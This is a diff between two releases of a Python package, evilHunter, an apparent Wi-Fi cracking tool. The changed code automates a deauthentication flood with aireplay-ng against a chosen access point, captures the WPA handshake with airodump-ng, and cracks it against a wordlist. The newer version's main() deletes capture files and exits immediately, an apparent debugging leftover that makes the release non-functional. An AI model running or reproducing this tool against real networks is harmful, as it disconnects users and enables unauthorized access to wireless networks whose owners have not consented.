# Comparing `tmp/evilHunter-0.1.5.tar.gz` & `tmp/evilHunter-0.1.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.5.tar", last modified: Fri Jun  9 21:35:48 2023, max compression
+gzip compressed data, was "evilHunter-0.1.6.tar", last modified: Sat Jun 10 09:29:15 2023, max compression
```

## Comparing `evilHunter-0.1.5.tar` & `evilHunter-0.1.6.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-09 21:35:48.834514 evilHunter-0.1.5/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1673 2023-06-09 21:35:48.834514 evilHunter-0.1.5/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1440 2023-06-09 11:15:59.000000 evilHunter-0.1.5/README.md
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-09 21:35:48.834514 evilHunter-0.1.5/evilHunter.egg-info/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1673 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      201 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        9 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/requires.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-09 21:35:48.000000 evilHunter-0.1.5/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)    15527 2023-06-09 21:25:06.000000 evilHunter-0.1.5/evilHunter.py
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-09 21:35:48.834514 evilHunter-0.1.5/setup.cfg
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      520 2023-06-09 21:35:29.000000 evilHunter-0.1.5/setup.py
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-10 09:29:15.403884 evilHunter-0.1.6/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1673 2023-06-10 09:29:15.403884 evilHunter-0.1.6/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1440 2023-06-09 11:15:59.000000 evilHunter-0.1.6/README.md
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-10 09:29:15.403884 evilHunter-0.1.6/evilHunter.egg-info/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1673 2023-06-10 09:29:15.000000 evilHunter-0.1.6/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      201 2023-06-10 09:29:15.000000 evilHunter-0.1.6/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-10 09:29:15.000000 evilHunter-0.1.6/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        9 2023-06-10 09:29:15.000000 evilHunter-0.1.6/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-10 09:29:15.000000 evilHunter-0.1.6/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)    15576 2023-06-09 22:58:05.000000 evilHunter-0.1.6/evilHunter.py
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-10 09:29:15.403884 evilHunter-0.1.6/setup.cfg
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      520 2023-06-10 09:29:05.000000 evilHunter-0.1.6/setup.py
```

### Comparing `evilHunter-0.1.5/PKG-INFO` & `evilHunter-0.1.6/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.5
+Version: 0.1.6
 Summary: Cracking WiFi(Hanshake)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
```

### Comparing `evilHunter-0.1.5/README.md` & `evilHunter-0.1.6/README.md`

 * *Files identical despite different names*

### Comparing `evilHunter-0.1.5/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.6/evilHunter.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.5
+Version: 0.1.6
 Summary: Cracking WiFi(Hanshake)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
```

### Comparing `evilHunter-0.1.5/evilHunter.py` & `evilHunter-0.1.6/evilHunter.py`

 * *Files 2% similar despite different names*

```diff
@@ -18,20 +18,18 @@
     print(Fore.GREEN + "\n\t[*] " + Fore.YELLOW + "Librerias importadas correctamente...")
 
 except ModuleNotFoundError as e:
     print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
     print("[!] Exiting...")
     exit(1)
 
-# Juntar con port_scan
-# Añadir anilisis de WiFis
+# Solicionar <lenght:
 
 def delete_files():
-    os.system("rm -r captures/* > /dev/null")
-    os.system("rm -r espec/* > /dev/null")
+    os.system('find captures -type f ! -name "*.cap" -delete')
 
 
 def restart_net():
     os.system("service networking restart > /dev/null")
     os.system("service NetworkManager restart > /dev/null")
 # COMPROBAR SI EL ARGUMENTO -w FUNCIONA Y SE COMPRUEBA
 
@@ -55,15 +53,15 @@
 
     try:
         if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
             os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
     except NameError:
         pass
 
-    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting all capture files..."
+    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
           + Fore.RESET)
 
     restart_net()
     delete_files()
 
     print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
     exit()
@@ -318,96 +316,89 @@
             print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
             time.sleep(0.5)
             print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
             prepare_attack(dict, network_to_attack, args)
 
 
 def prepare_attack(dict, network_to_attack, args):
-    file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
+    file = None
+
+    while not file:
+        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
                                                     "Enter the name of the file to save [E.j capture1] > ")
 
+        if os.system("find captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
+            print(Fore.RED + "\n\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
+            file = None
+
+
     # Definimos bssid y channel
     bssid = dict[network_to_attack]['bssid']
     ch = dict[network_to_attack]['channel']
-
     # Leer handshake
-    direc = "captures/" + bssid
+    direc = "captures/" + network_to_attack
 
     if not os.path.exists(direc):
         os.makedirs(direc)
     time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
           Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
           Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
 
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
 
 
-    # Preparamos multiproceso para poder pararlos todos a la vez
-    #deauth = multiprocessing.Process(target=deauth_clients(bssid))
-
-
-    # Preparamos subproceso de capture hand
-    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file))
+    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file, network_to_attack))
 
     # Iniciamos la captura del handshake y envio de deauth
     capture.start()
-    #deauth.start()
 
     # Juntamos para detener
     capture.join()
-    #deauth.join()
-
-
-"""def deauth_clients(bssid):
-    # Enviar paquetes "deauth"
-"""
 
 
-def capture_handshake(direc, args, bssid, ch, file):
+def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
+    test = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
 
-    hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
+    hand = subprocess.Popen(["airodump-ng", "-w", f"captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
-
-    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
     done = False
     while True:
         try:
             output = hand.stdout.readline()
-
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
                 done = True
                 break
 
         except KeyboardInterrupt:
             break
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
         print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...\n\n")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
-    crack_handshake(direc, args)
+    crack_handshake(direc, args, file)
 
 
 def find_wordlists(wordlists):
     found = os.system("find {} > /dev/null".format(wordlists))
     while found != 0:
         print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
         wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
         found = os.system("find {}  > /dev/null".format(wordlists))
 
     return wordlists
 
 
-def crack_handshake(direc, args):
+def crack_handshake(direc, args, file):
     # Buscamos arhchivo .cap
-    os.system("find {}/*.cap > espec/capture_file ".format(direc))
+    os.system("find {}/{}*.cap > espec/capture_file ".format(direc, file))
 
     # Comprobamos si nos ha pasasdo discionario y si existe en su sistema
     wordlist = find_wordlists(args.wordlist)
 
     # Abrimos el capture_file donde se encuentra la ruta hacia  el .cap
     with open("espec/capture_file", "r") as file:
         file = file.read().strip()
@@ -428,14 +419,16 @@
             print(output.decode().strip())
         except KeyboardInterrupt:
             break
 
 
 def main():
     try:
+        delete_files()
+        exit()
         # Recogemos argumentos
         parser = argparse.ArgumentParser()
         parser.add_argument("-w", "--wordlist", help="Use an extern wordlists dictionary", required=True)
         args = parser.parse_args()
 
         # Somos root?
         am_i_root()
```

### Comparing `evilHunter-0.1.5/setup.py` & `evilHunter-0.1.6/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.5",
+    version="0.1.6",
     description="Cracking WiFi(Hanshake)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
```

